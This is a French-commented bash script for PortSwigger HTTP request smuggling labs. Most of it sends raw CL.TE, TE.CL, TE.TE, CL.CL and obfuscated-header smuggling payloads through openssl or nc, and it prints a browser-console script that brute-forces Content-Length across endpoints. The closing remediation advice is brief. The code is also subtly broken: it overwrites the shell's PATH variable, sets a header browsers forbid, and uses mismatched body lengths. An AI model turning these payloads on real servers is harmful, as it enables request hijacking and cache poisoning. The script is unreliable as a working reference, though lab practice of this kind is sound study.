#!/bin/bash

# --------- Utilisation ---------
# ./script.sh https://<lab>.web-security-academy.net
# --------------------------------

if [ -z "$1" ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"
PROTO="$(echo $LAB_URL | grep -oE '^https?')"
HOST="$(echo $LAB_URL | sed -E 's|https?://([^/]+).*|\1|')"
PORT="80"
[ "$PROTO" = "https" ] && PORT="443"
PATH="$(echo $LAB_URL | grep -oE 'https?://[^/]+(/.*)?' | sed -E 's|https?://[^/]+||')"
[ -z "$PATH" ] && PATH="/"
COOKIE="session=<your-session-cookie>" # À adapter si besoin

print_sep() {
    echo "------------------------------------------------------"
}

send_raw() {
    # $1: payload, $2: filename, $3: description
    if [ "$PROTO" = "https" ]; then
        echo -e "$1" | openssl s_client -quiet -connect "$HOST:$PORT" 2>/dev/null > "$2"
    else
        echo -e "$1" | nc "$HOST" "$PORT" > "$2"
    fi
    if grep -E -i "Congratulations|flag" "$2" > /dev/null; then
        echo "[+] Flag détecté ! ($3, fichier $2)"
        grep -E -i "Congratulations|flag" "$2" | head -n 2
    else
        echo "[-] Pas de flag détecté. ($3)"
    fi
}

# Challenge 1: HTTP request smuggling, basic CL.TE vulnerability
challenge_clte() {
    print_sep
    echo "[Challenge 1] HTTP request smuggling, basic CL.TE vulnerability"
    payload1="POST $PATH HTTP/1.1\r
Host: $HOST\r
Content-Length: 13\r
\r
NORMALPAYLOAD\r
"
    send_raw "$payload1" /tmp/smuggle_clte_inoff.txt "payload inoffensif"
    payload2="POST $PATH HTTP/1.1\r
Host: $HOST\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
SMUGGLED\r
"
    send_raw "$payload2" /tmp/smuggle_clte_vuln.txt "payload vulnérable"
}

# Challenge 2: HTTP request smuggling, basic TE.CL vulnerability
challenge_tecl() {
    print_sep
    echo "[Challenge 2] HTTP request smuggling, basic TE.CL vulnerability"
    payload1="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding: identity\r
Content-Length: 3\r
\r
x=1\r
"
    send_raw "$payload1" /tmp/smuggle_tecl_inoff.txt "payload inoffensif"
    payload2="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding: chunked\r
Content-Length: 3\r
\r
8\r
SMUGGLED\r
0\r
"
    send_raw "$payload2" /tmp/smuggle_tecl_vuln.txt "payload vulnérable"
}

# Challenge 3: HTTP request smuggling, TE.TE vulnerability
challenge_tete() {
    print_sep
    echo "[Challenge 3] HTTP request smuggling, TE.TE vulnerability"
    payload1="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding: identity\r
Transfer-Encoding: identity\r
Content-Length: 6\r
\r
x=1\r
"
    send_raw "$payload1" /tmp/smuggle_tete_inoff.txt "payload inoffensif"
    payload2="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding: chunked\r
Transfer-Encoding: cow\r
Content-Length: 6\r
\r
0\r
SMUG\r
"
    send_raw "$payload2" /tmp/smuggle_tete_vuln.txt "payload vulnérable"
}

# Challenge 4: HTTP request smuggling, CL.CL vulnerability
challenge_clcl() {
    print_sep
    echo "[Challenge 4] HTTP request smuggling, CL.CL vulnerability"
    payload1="POST $PATH HTTP/1.1\r
Host: $HOST\r
Content-Length: 13\r
Content-Length: 13\r
\r
NORMALPAYLOAD\r
"
    send_raw "$payload1" /tmp/smuggle_clcl_inoff.txt "payload inoffensif"
    payload2="POST $PATH HTTP/1.1\r
Host: $HOST\r
Content-Length: 20\r
Content-Length: 13\r
\r
SMUGGLED=1\r
"
    send_raw "$payload2" /tmp/smuggle_clcl_vuln.txt "payload vulnérable"
}

# Challenge 5: HTTP request smuggling, obfuscated TE header
challenge_obfuscated_te() {
    print_sep
    echo "[Challenge 5] HTTP request smuggling, obfuscated TE header"
    payload1="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding: identity\r
Content-Length: 13\r
\r
NORMALPAYLOAD\r
"
    send_raw "$payload1" /tmp/smuggle_obfte_inoff.txt "payload inoffensif"
    payload2="POST $PATH HTTP/1.1\r
Host: $HOST\r
Transfer-Encoding : chunked\r
Content-Length: 13\r
\r
0\r
SMUGGLED\r
"
    send_raw "$payload2" /tmp/smuggle_obfte_vuln.txt "payload vulnérable"
}

# Challenge 6: HTTP request smuggling, browser-powered (démarche récursive JS)
challenge_browser_powered() {
    print_sep
    echo "[Challenge 6] HTTP request smuggling, browser-powered (démarche récursive JS)"
    echo "  [Info] Exécutez le code JS suivant dans la console du navigateur sur le lab :"
    cat <<EOF

/* --- PAYLOAD JS À COLLER DANS LA CONSOLE DU NAVIGATEUR --- */
/*
Pour chaque endpoint, ce script teste plusieurs valeurs de Content-Length.
Il affiche la réponse et déclenche une alerte si un flag est détecté.
*/

const base = '$PATH' === '' ? '/' : '$PATH';
const endpoints = [
  base,
  base.endsWith('/') ? base + 'search' : base + '/search',
  base.endsWith('/') ? base + '?' : base + '/?search=smuggle',
  base.endsWith('/') ? base + 'post' : base + '/post',
  base.endsWith('/') ? base + 'submit' : base + '/submit',
  base.endsWith('/') ? base + 'login' : base + '/login',
  base.endsWith('/') ? base + 'register' : base + '/register'
];

const minCL = 1, maxCL = 10;
const body = 'x=1';

(async () => {
  for (const endpoint of endpoints) {
    for (let cl = minCL; cl <= maxCL; cl++) {
      try {
        const res = await fetch(endpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': String(cl)
          },
          body: body
        });
        const txt = await res.text();
        console.log(\`[endpoint: \${endpoint}] [Content-Length: \${cl}]\\n\`, txt.slice(0,300));
        if (/Congratulations|flag|solved/i.test(txt)) {
          alert(\`FLAG DETECTED! endpoint: \${endpoint}, Content-Length: \${cl}\`);
        }
      } catch (e) {
        console.log(\`[endpoint: \${endpoint}] [Content-Length: \${cl}]\\nErreur: \`, e);
      }
    }
  }
})();

/*
- Adaptez la liste des endpoints si besoin selon le lab.
- Observez la console pour repérer le flag ou le comportement anormal.
- Vous pouvez augmenter maxCL ou modifier le body pour tester d'autres cas.
*/
EOF
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Unifiez la gestion des en-têtes Content-Length et Transfer-Encoding sur tous les serveurs."
    echo "- Rejetez toute requête ambiguë ou contenant les deux en-têtes."
    echo "- Désactivez le keep-alive entre reverse-proxy et backend si possible."
    echo "- Pour les labs PortSwigger, adaptez les payloads et vérifiez la présence du flag."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/request-smuggling"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "Pour chaque challenge, le script indique seulement si un flag est détecté ou non pour chaque test pertinent."
    echo "Challenge 6 : JS généré pour tests exhaustifs sur Content-Length et endpoints."
    echo "Contrôle automatique du flag ou message de succès."
    print_sep
}

echo "=== Script PortSwigger HTTP Request Smuggling (résultat pertinent par test, démarche récursive JS sur challenge 6) ==="
challenge_clte
challenge_tecl
challenge_tete
challenge_clcl
challenge_obfuscated_te
challenge_browser_powered
print_remediation
print_summary

# End of script
